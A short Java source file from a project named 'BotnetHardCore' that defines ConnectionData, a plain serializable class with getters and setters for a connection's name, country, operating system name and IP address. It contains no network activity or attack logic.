package model;

import java.io.Serializable;
import java.net.InetAddress;

/**
 * Project: BotnetHardCore
 * User: Jeferson Machado <jefersonmachado@univille.br>
 * Date: 24/07/2018
 * Time: 21:28
 */
public class ConnectionData implements Serializable {

    private String name;
    private String country;
    private String operationalSystemName;
    private InetAddress ipAddress;

    public String getCountry() {
        return country;
    }

    public void setCountry(String country) {
        this.country = country;
    }

    public String getOperationalSystemName() {
        return operationalSystemName;
    }

    public void setOperationalSystemName(String operationalSystemName) {
        this.operationalSystemName = operationalSystemName;
    }

    public InetAddress getIpAddress() {
        return ipAddress;
    }

    public void setIpAddress(InetAddress ipAddress) {
        this.ipAddress = ipAddress;
    }

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }
}